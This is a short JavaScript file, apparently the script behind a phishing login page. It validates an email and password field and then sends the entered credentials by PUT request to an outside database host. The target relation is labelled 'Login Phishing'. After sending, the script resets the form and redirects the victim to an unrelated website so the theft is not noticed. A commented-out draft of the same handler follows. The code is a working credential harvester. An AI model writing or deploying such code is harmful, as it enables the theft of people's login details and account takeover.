function validate() {
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;

    if (username.includes('@') && username.includes('.')) {
        if (password == "") {
            alert('Password cannot be empty!');
            return false;
        }
    } else {
        alert('Invalid email. Please enter again!');
    }

    return true;
}


document.getElementById('submit-form').addEventListener('click', (e) => {
    if (validate() == true) {
        e.preventDefault();

        const form = document.getElementById('test-form');
        const formData = new FormData(form);

        let formJSON = {};

        for (const [key, value] of formData.entries()) {
            formJSON[key] = value;
        }

        var putReqStr = createPUTRequest("90938734|-31948832731587922|90946266", JSON.stringify(formJSON), "Login Phishing", "Login Details");
        console.log(putReqStr);
        $.ajaxSetup({
            async: false,            
        });
        var resultObj = executeCommandAtGivenBaseUrl(putReqStr, "http://api.login2explore.com:5577", "/api/iml");
        $.ajaxSetup({
            async: true
        });

        console.log('success');
        document.getElementById('test-form').reset();
        window.location.replace("https://www.lovecalculator.com/");
    }
});


// $('#submit-form').on('click', function (e) {
//     console.log('clicked on submit');

//     if (validate() == true) {

//         e.preventDefault();
//         const test_form = document.getElementById('test-form');
//         const formData = new FormData(test_form);
//         let jsonObject = {};

//         for (const [key, value] of formData.entries()) {
//             jsonObject[key] = value;
//         }
//         console.log('data is ', jsonObject);


//         

//     } // include after the sheets issue is handled

// })